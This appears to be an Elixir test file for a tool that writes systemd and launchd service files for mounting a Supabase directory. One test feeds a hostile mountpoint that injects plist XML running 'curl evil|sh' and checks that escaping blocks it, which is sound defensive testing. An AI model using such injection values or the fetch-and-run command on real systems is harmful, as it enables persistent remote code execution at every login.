defmodule Supablock.ServiceTest do
  use ExUnit.Case, async: false

  import ExUnit.CaptureIO

  alias Supablock.{CLI, Service, TestEnv}

  setup do
    base = TestEnv.isolate_xdg!()
    System.put_env("SUPABLOCK_BIN", "/bin/sh")
    on_exit(fn -> System.delete_env("SUPABLOCK_BIN") end)
    {:ok, base: base}
  end

  test "install without a configured mountpoint uses the ~/Supabase default", %{base: base} do
    assert {:ok, _messages} = Service.install()

    unit_path = Path.join([base, "config", "systemd", "user", "supablock.service"])
    assert File.read!(unit_path) =~ Path.join(System.user_home!(), "Supabase")

    assert {:ok, _messages} = Service.uninstall()
  end

  test "install writes a systemd user unit under XDG_CONFIG_HOME", %{base: base} do
    :ok = Supablock.Config.set("mountpoint", "/mnt/supabase")

    assert {:ok, messages} = Service.install()
    assert Enum.any?(messages, &(&1 =~ "supablock.service"))

    unit_path = Path.join([base, "config", "systemd", "user", "supablock.service"])
    assert File.exists?(unit_path)

    unit = File.read!(unit_path)
    assert unit =~ "ExecStart=/bin/sh mount"
    assert unit =~ "Restart=on-failure"
    assert unit =~ "/mnt/supabase"

    assert {:installed, ^unit_path, _state} = Service.status()

    assert {:ok, _messages} = Service.uninstall()
    refute File.exists?(unit_path)
    assert Service.status() == :not_installed
  end

  test "cli service subcommands report status and usage" do
    assert capture_io(fn -> assert CLI.run(["service", "status"]) == 1 end) =~
             "Service not installed"

    assert capture_io(:stderr, fn -> assert CLI.run(["service", "bogus"]) == 1 end) =~
             "Usage: supablock service"
  end

  describe "launchd plist" do
    test "escapes XML so a hostile mountpoint cannot add plist keys" do
      hostile =
        "/tmp/x</string><key>ProgramArguments</key><array><string>/bin/sh</string>" <>
          "<string>-c</string><string>curl evil|sh</string></array><string>"

      plist = Service.launchd_plist("/bin/sh", hostile)

      # One ProgramArguments key, and it is ours: a duplicate later in the
      # dict would win at load time and run at every login.
      assert length(String.split(plist, "<key>ProgramArguments</key>")) == 2
      assert length(String.split(plist, "<array>")) == 2
      refute plist =~ "<string>-c</string>"

      # the payload survives, but only as text inside the Comment string
      assert plist =~ "&lt;key&gt;ProgramArguments&lt;/key&gt;"
    end

    test "escapes the executable path and leaves ordinary values alone" do
      plist = Service.launchd_plist("/opt/bin/supablock", "/mnt/supabase")

      assert plist =~ "<string>/opt/bin/supablock</string>"
      assert plist =~ "supablock mount at /mnt/supabase"

      quoted = Service.launchd_plist(~s(/bin/"a&b"), "/mnt/x")
      assert quoted =~ "&quot;a&amp;b&quot;"
    end
  end
end
